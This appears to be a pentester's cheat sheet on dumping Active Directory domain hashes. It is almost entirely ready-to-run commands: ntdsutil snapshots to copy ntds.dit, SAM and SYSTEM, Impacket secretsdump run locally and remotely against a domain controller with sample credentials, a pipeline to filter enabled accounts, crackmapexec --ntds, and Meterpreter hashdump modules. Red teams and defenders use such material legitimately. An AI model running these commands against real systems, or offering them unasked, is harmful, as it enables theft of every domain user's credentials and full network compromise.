# Dumping domain hashes

## NTDSutil

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
-- or --

ntdsutil
> snapshot
> activate instance ntds
> create
> mount {GUID}
```

Then browse to the mounted directory in the C:/ and copy out the ntds.dit && SAM & SYSTEM file to your prefered location

To delete the snapshot after:

```
delete {GUID}
```

Then pull the hashes out with Impacket's Secretdump

```
impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash -user-status -outputfile myhashes local
```

The tidy up the hashes

```
cat myhashes.ntds | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -d"(" -f1
```

Or you can do it with a 1 liner remotely. but becareful it doesnt crash the connection

{% code overflow="wrap" %}
```
impacket-secretsdump -just-dc -user-status -exec-method smbexec 'domaincorp/user123:Password1@10.144.2.11' -outputfile myhashes
```
{% endcode %}

## crackmapexec

```
crackmapexec smb <DC-IP> -u <user> -p <password> --ntds
```

## Meterpreter

Once you have your Meterpreter shell from your exploit of choice, such as PSEXEC

```
run post/windows/gather/smart_hashdump
--- or ---
run post/windows/gather/credentials/domain_hashdump
```
